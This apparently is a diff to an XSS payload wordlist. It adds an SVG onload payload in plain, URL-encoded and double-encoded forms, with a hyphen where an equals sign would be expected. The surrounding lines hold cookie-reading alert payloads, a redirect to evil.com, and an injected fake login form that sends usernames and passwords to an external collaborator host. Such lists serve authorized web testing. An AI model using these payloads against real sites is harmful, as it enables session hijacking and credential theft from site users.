@@ -3,6 +3,9 @@
 mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
 javascript:alert(1)
 javascript://%0aalert(document.cookie)
+<svg only=1 onload-alert(document.cookie)>
+%3Csvg+only%3D1+onload-alert%28document.+Cookie%29%3E
+%253Csvg%2Bonly%253D1%2Bonload-alert%2528document.%2BCookie%2529%253E
 <A HREF="http://evil.com/">Login Here </A>
 <script>document.location.href="http://evil.com"</script>
 <h3>Please login to proceed</h3> <form action=http://abp16yqa8m56p2kznk76xvmnqew5kwakz.oastify.com>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
